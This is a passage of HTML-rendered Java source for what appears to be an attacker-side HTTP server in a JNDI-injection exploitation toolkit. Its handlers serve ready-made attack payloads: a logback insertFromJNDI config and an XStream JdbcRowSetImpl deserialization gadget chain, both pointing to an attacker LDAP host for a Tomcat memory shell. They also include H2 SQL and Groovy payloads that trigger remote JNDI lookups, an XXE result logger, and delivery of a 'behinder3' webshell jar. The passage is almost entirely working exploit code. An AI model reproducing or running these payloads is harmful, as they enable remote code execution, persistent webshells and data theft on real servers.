class="string">&quot;success!&quot;</span>.getBytes();</span><br><span class="line">            exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + txtname + <span class="string">&quot;.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXMLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;&lt;configuration&gt;\n  &lt;insertFromJNDI env-entry-name=\&quot;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span>+ Config.ldapPort + <span class="string">&quot;/TomcatBypass/TomcatMemshell3\&quot; as=\&quot;appName\&quot; /&gt;\n&lt;/configuration&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="string">&quot;&lt;linked-hash-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;flags&gt;0&lt;/flags&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;value class=\&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;dataSource class=\&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;is class=\&quot;javax.crypto.CipherInputStream\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;cipher class=\&quot;javax.crypto.NullCipher\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;initialized&gt;false&lt;/initialized&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;opmode&gt;0&lt;/opmode&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;serviceIterator class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;iter class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;iter class=\&quot;java.util.Collections$EmptyIterator\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;next class=\&quot;com.sun.rowset.JdbcRowSetImpl\&quot; serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;dataSource&gt;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:1389/basic/TomcatMemShell3&lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;listeners/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;params/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/iter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;filter class=\&quot;javax.imageio.ImageIO$ContainsFilter\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;name&gt;getDatabaseMetaData&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;parameter-types/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;name&gt;foo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/filter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;next class=\&quot;string\&quot;&gt;foo&lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/serviceIterator&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;lock/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/cipher&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;input class=\&quot;java.lang.ProcessBuilder$NullInputStream\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ibuffer&gt;&lt;/ibuffer&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;done&gt;false&lt;/done&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ostart&gt;0&lt;/ostart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ofinish&gt;0&lt;/ofinish&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;closed&gt;false&lt;/closed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/is&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;consumed&gt;false&lt;/consumed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;transferFlavors/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataLen&gt;0&lt;/dataLen&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/linked-hash-set&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(xmlName.equals(<span class="string">&quot;a&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (xmlName.equals(<span class="string">&quot;x&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xstream.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + xmlName + <span class="string">&quot;.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleSQLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;echo&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389/TomcatBypass/TomcatEcho\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sqlName.equalsIgnoreCase(<span class="string">&quot;inject&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> String.valueOf(System.nanoTime());</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;CREATE ALIAS &quot;</span> + name + <span class="string">&quot; AS CONCAT(&#x27;void ex()throws Exception&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#123;Object o = com.sun.rowset.JdbcRowSetImpl();&#x27;,&#x27; o.setDataSourceName(\&quot;ldap:// + host + :1389/inject.class\&quot;);&#x27;,&#x27; &#x27;o.setAutoCommit(\&quot;true\&quot;);,&#x27;&#125;&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;CALL &quot;</span> + name + <span class="string">&quot;();\&quot;&#125;&quot;</span>;</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + sqlName + <span class="string">&quot;.sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handlerGroovyRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> exchange.getRequestURI().getHost();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;/TomcatBypass/TomcatEcho&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">groovyName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(groovyName.equalsIgnoreCase(<span class="string">&quot;groovyecho&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;class demo &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    static void main()&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        com.sun.rowset.JdbcRowSetImpl o = new com.sun.rowset.JdbcRowSetImpl();\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setDataSourceName(\&quot;ldap://&quot;</span> + host + <span class="string">&quot;:1389&quot;</span> + exp + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        o.setAutoCommit(true);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + groovyName + <span class="string">&quot;.groovy&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//                exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXXELogRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">exchangeImpl</span> <span class="operator">=</span> FieldUtils.readField(exchange, <span class="string">&quot;impl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> FieldUtils.readField(exchangeImpl, <span class="string">&quot;req&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">startLine</span> <span class="operator">=</span> (String) FieldUtils.readField(request, <span class="string">&quot;startLine&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[+] XXE Attack Result: &quot;</span> + startLine);</span><br><span class="line">        exchange.sendResponseHeaders(<span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleJarRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (jarName.equalsIgnoreCase(<span class="string">&quot;behinder3&quot;</span>))&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + <span class="string">&quot;behinder3.jar&quot;</span>;</span><br><span class="line">            <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            bytes = fileReader.readBytes();</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator +<span class="string">&quot;data&quot;</span> + File.separator + jarName + <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes =  <span class="literal">null</span>;</span><br><span class="line">                <span class="type">FileReader</span> <span class="variable">fileReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(filename,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                bytes = fileReader.readBytes();</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleClassRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span 